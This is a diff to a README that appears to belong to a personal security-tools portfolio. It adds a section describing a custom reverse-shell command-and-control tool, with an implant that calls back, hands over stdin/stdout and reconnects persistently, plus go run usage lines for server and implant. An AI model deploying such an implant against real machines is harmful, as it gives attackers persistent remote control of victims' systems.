@@ -26,6 +26,15 @@ I also used **Terraform** to architect a custom "Vulnerable Lab" scenario in AWS
 * **Defense Mechanism:** Detects connection attempts, logs the attacker's IP, and sends a fake "Vulnerable Admin" banner to waste their time.
 * **Usage:** `go run tools/HoneyPort/honeyport.go 8080`
 
+### 6. Reverse Shell (C2)
+* **What it does:** A custom Command & Control framework consisting of a Listener (Server) and a Payload (Implant).
+* **Architecture:**
+    * **Implant:** Connects back to the server (Reverse TCP), redirects `stdin`/`stdout` to the socket, and includes a persistence loop to reconnect if the link is dropped.
+    * **Server:** Listens for incoming connections and provides an interactive shell to control de victim.
+* **Usage:**
+    * **Server:** `go run tools/ReverseShell/server/server.go`
+    * **Implant:** `go run tools/ReverseShell/implant/implant.go <SERVER_IP:PORT>`
+
 ## Infrastructure as Code (Terraform)
 I built two environments in AWS:
 1. **The Fortress:** A locked-down EC2 instance allowing SSH only from my specific IP.
